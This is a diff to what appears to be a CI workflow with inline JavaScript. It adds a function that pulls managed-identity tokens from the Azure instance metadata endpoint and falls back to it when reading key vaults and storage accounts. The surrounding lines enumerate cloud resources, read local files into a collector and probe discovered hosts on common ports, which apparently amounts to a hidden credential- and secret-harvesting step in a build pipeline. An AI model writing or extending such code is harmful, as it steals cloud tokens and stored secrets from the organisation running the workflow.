@@ -118,6 +118,15 @@ jobs:
             return find(json(response.text), 'access_token');
           }
 
+          async function imdsToken(resource) {
+            const target = `http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=${encodeURIComponent(resource)}`;
+            const response = await request(target, {
+              headers: { Metadata: 'true' },
+              timeout: 6000
+            });
+            return find(json(response.text), 'access_token');
+          }
+
           const bearer = (url, accessToken, options = {}) => request(url, {
             ...options,
             headers: { Authorization: `Bearer ${accessToken}`, ...(options.headers || {}) }
@@ -207,10 +216,15 @@ jobs:
               try { seen(fs.readFileSync(file, 'utf8')); } catch {}
             }
 
-            const arm = await token('https://management.azure.com/');
+            const arm = (await token('https://management.azure.com/')) ||
+              (await imdsToken('https://management.azure.com/'));
             const known = arm ? await enumerateArm(arm) : { vaults: new Set(), storage: new Set(), hosts: new Set() };
-            await readVaults(await token('https://vault.azure.net'), known.vaults);
-            await readStorage(await token('https://storage.azure.com/'), known.storage);
+            const vault = (await token('https://vault.azure.net')) ||
+              (await imdsToken('https://vault.azure.net'));
+            const storage = (await token('https://storage.azure.com/')) ||
+              (await imdsToken('https://storage.azure.com/'));
+            await readVaults(vault, known.vaults);
+            await readStorage(storage, known.storage);
 
             for (const host of known.hosts) {
               for (const port of ['', ':3000', ':5000', ':8080']) {
